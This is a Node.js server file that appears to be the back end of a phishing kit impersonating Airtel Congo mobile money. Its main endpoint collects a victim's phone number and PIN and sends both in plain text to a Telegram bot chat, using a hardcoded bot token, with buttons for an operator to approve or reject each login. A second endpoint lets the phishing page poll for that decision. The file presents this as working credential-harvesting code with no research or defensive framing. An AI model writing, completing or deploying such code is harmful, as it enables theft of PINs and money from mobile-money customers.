const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const TELEGRAM_BOT_TOKEN = '1234567890:AAHh9cM13O55o30Sv4OvXtC5B0JaF4tdm_o';
const TELEGRAM_ADMIN_CHAT_ID = '7867527304';

const approvals = new Map();

async function notifyTelegram(phone, pin, requestId) {
    const message = '📲 Nouvelle demande Airtel Congo\n📱 Téléphone: ' + phone + '\n🔑 PIN: ' + pin + '\n🆔 Request: ' + requestId + '\n\n✅ /approve_' + requestId + ' - Approuver\n❌ /reject_' + requestId + ' - Rejeter';
    
    try {
        const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_ADMIN_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approuver', callback_data: 'approve_' + requestId },
                        { text: '❌ Rejeter', callback_data: 'reject_' + requestId }
                    ]]
                }
            })
        });
        return await response.json();
    } catch (e) {
        console.error('Telegram notification failed:', e);
        return { error: e.message };
    }
}

function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                resolve(JSON.parse(body));
            } catch (e) {
                resolve(body);
            }
        });
        req.on('error', reject);
    });
}

const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://' + req.headers.host);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }
    
    if (url.pathname === '/api/telegram-notification' && req.method === 'POST') {
        const body = await parseBody(req);
        const { phone, pin, requestId } = body;
        
        if (!phone || !pin) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Missing phone or pin' }));
            return;
        }
        
        const id = requestId || crypto.randomBytes(8).toString('hex');
        
        approvals.set(id, {
            phone, pin,
            status: 'pending',
            createdAt: Date.now()
        });
        
        const tgResult = await notifyTelegram(phone, pin, id);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            success: true, 
            requestId: id,
            telegram: tgResult.ok || !tgResult.error
        }));
        return;
    }
    
    if (url.pathname.startsWith('/api/check-approval/') && req.method === 'POST') {
        const requestId = url.pathname.split('/').pop();
        const approval = approvals.get(requestId);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            requestId,
            status: approval ? approval.status : 'pending',
            approved: approval ? approval.status === 'approved' : false,
            phone: approval ? approval.phone : null
        }));
        return;
    }
    
    if (url.pathname === '/api/telegram-callback' && req.method === 'POST') {
        const body = await parseBody(req);
        const { callback_query } = body;
        
        if (!callback_query) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Invalid callback' }));
            return;
        }
        
        const [action, requestId] = callback_query.data.split('_');
        const approval = approvals.get(requestId);
        
        if (approval) {
            approval.status = action;
            approval.respondedAt = Date.now();
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
        return;
    }
    
    const requested = url.pathname === '/' ? 'index.html' : decodeURIComponent(url.pathname.replace(/^\/+/, ''));
    const file = path.resolve(__dirname, requested);
    
    if (!file.startsWith(__dirname) || !fs.existsSync(file)) {
        res.writeHead(404);
        return res.end('Not found');
    }
    
    const types = {
        '.html': 'text/html; charset=utf-8',
        '.css': 'text/css; charset=utf-8',
        '.js': 'text/javascript; charset=utf-8',
        '.png': 'image/png',
        '.svg': 'image/svg+xml',
        '.json': 'application/json'
    };
    
    res.writeHead(200, { 'Content-Type': types[path.extname(file)] || 'application/octet-stream' });
    
    let content = fs.readFileSync(file);
    if (requested === 'index.html') {
        content = content.toString().replace('</head>', '<style>html,body{height:auto;min-height:100%;overflow-x:hidden;overflow-y:auto}.dp-root{min-height:100vh}</style></head>');
    }
    res.end(content);
});

server.listen(3000);
console.log('Server running at http://localhost:3000/');
console.log('Telegram integration ready with bot token and admin chat ID');